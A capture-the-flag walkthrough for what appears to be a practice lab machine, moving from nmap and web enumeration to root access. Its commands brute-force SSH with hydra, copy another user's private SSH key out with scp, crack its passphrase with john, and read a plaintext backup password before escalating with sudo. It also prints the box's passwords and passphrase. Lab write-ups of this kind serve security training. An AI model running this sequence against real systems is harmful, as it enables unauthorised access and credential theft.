---

## Step 1: Enumeration

### Port and service discovery
```bash
nmap -sC -sV -oN initial_scan.txt 10.48.187.110
```
- **-sC:** Default safe scripts
- **-sV:** Service version detection
- **-oN:** Save results for documentation

Typical findings for this box:
- **22/tcp SSH**
- **80/tcp HTTP**
- **445/tcp SMB**

---

### Website recon and the Jan ↔ Kay message

We enumerate HTTP thoroughly to uncover hints, usernames, and artifacts:

- Basic fingerprinting:
  ```bash
  curl -I http://10.48.187.110
  curl -s http://10.48.187.110 | head -n 50
  ```
- Low‑hanging files:
  ```bash
  curl -s http://10.48.187.110/robots.txt
  curl -s http://10.48.187.110/.git/HEAD
  ```
- Directory brute‑force (common files and extensions):
  ```bash
  gobuster dir -u http://10.48.187.110 \
    -w /usr/share/wordlists/dirb/common.txt \
    -x txt,html,php
  ```

From this enumeration, we discover a simple text page (e.g., `/message`, `/notes`, or `/message.txt`) containing a short exchange between users Jan and Kay. Retrieve it with curl:

```bash
curl -s http://10.48.187.110/message
```

The page content hints:
- Valid usernames: **jan**, **kay**
- Operational notes: Jan asks Kay to clean up an old SSH key
- A crucial clue: Kay mentions leaving a “backup password file” in her home directory

These hints directly inform the attack plan: target Jan for the initial shell; then pivot to Kay via her SSH key and search Kay’s home for a backup password.

---

### SMB presence (cross‑check)
```bash
smbclient -L //10.48.187.110 -N
```
- Confirms Samba is present. Even if shares aren’t accessible, we already have usernames from the web message.

---

## Step 2: Initial access (Jan)

### Hydra was slow for SSH
```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 4 ssh://10.48.187.110
```
- Observed ~64 tries/min (SSH handshake cost + throttling)
- Practical pivot: smaller wordlists and informed guesses

### Login as Jan
```bash
ssh jan@10.48.187.110
```
- Password: armando (commonly used on this box and confirmed via walkthroughs)

Foothold achieved.

---

## Step 3: Pivot to Kay via SSH key

### Find and exfiltrate Kay’s key
```bash
ls -la /home/kay/.ssh
scp jan@10.48.187.110:/home/kay/.ssh/id_rsa .
chmod 600 id_rsa
```

### Crack the key passphrase
```bash
ssh2john id_rsa > kay.hash
john --wordlist=/usr/share/wordlists/rockyou.txt kay.hash
```
- Passphrase: beeswax

### SSH as Kay
```bash
ssh -i id_rsa kay@10.48.187.110
```
- Enter passphrase beeswax

Pivot complete.

---

## Step 4: Privilege escalation

### Dead ends (documented)
- **sudo -l** (initially): Requires Kay’s system password → blocked
- **pkexec /bin/bash**: Prompts for system password → blocked
- **SUID binaries**: Standard set, nothing trivially exploitable here
- **Cron jobs**: Root‑owned, not writable
- **Capabilities**: Network‑related only (ping/traceroute), not helpful for privesc
- **Writable files**: Mostly pseudo‑files in `/proc` and `/run`

Why we moved on: these didn’t yield elevation without Kay’s password.

### Intended path signaled by the website message
Search Kay’s home for the “backup password” mentioned in the web note:

```bash
ls -la /home/kay
cat /home/kay/pass.bak
```

Found Kay’s system password:
```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

Use it with sudo:
```bash
sudo -l
# shows: (ALL : ALL) ALL
sudo /bin/bash
```

You’re root.

---

## Step 5: Capture the flag
```bash
whoami
id
ls -la /root
cat /root/flag.txt
```

Flag confirms completion and encourages exploring alternate paths.

---

## Key lessons
- Read the website. The Jan ↔ Kay message isn’t flavor text — it gives usernames and exact artifacts to hunt.
- Enumeration compounds: web hints → usernames → SSH keys → backup passwords → sudo.
- Hydra is powerful but slow for SSH. Smart guessing and web hints saved time.
- Privilege escalation often hinges on misconfigurations: here, a plaintext backup password plus full sudo rights.
